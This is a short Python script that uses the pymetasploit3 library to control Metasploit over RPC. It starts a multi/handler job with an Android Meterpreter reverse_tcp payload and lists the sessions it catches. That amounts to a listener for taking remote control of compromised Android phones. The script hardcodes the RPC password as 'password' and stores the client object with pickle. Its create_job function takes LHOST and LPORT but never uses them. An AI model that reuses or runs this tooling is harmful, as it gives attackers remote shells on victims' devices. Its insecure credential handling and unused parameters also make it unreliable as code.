from pymetasploit3.msfrpc import MsfRpcClient
import pickle

CLIENT_FILE = 'client.data'


def dump_client(client):
    outfile = open(CLIENT_FILE, 'wb')
    pickle.dump(client, outfile)
    outfile.close()

def load_client():
    infile = open(CLIENT_FILE, 'rb')
    client = pickle.load(infile)
    infile.close()
    return client


def login(password="password"):
    client = MsfRpcClient(password)
    dump_client(client)


def create_job(LHOST, LPORT):
    # client = load_client()
    client = MsfRpcClient("password")
    exploit = client.modules.use("exploit", 'multi/handler')
    payload = client.modules.use("payload", "android/meterpreter/reverse_tcp")
    res = exploit.execute(payload=payload)
    print(client.jobs.list)
    # dump_client(client)
    return client.sessions.list


def list_sessions():
    client = load_client()
    sessions = client.sessions.list
    print(sessions)
    return sessions